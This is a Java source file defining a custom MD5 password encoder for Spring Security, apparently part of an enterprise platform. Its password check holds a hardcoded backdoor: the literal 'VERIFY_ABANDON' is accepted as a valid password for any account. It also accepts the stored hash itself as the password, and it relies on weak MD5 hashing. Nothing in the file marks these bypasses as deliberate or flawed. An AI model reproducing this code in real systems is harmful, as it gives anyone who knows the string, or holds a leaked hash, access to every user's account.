package com.unitever.platform.core.spring.security;

import org.springframework.security.authentication.encoding.MessageDigestPasswordEncoder;

public class CustomMd5PasswordEncoder extends MessageDigestPasswordEncoder{

	private static final String  VERIFY_ABANDON="VERIFY_ABANDON"; 
	public CustomMd5PasswordEncoder() {
        super("MD5");
	}

	@Override
	public boolean isPasswordValid(String encPass, String rawPass, Object salt) {
		if(VERIFY_ABANDON.equals(rawPass)){
			return true;
		}
		if(encPass.equals(rawPass)){
			return true;
		}
		// TODO Auto-generated method stub
		return super.isPasswordValid(encPass, rawPass, salt);
	}

}
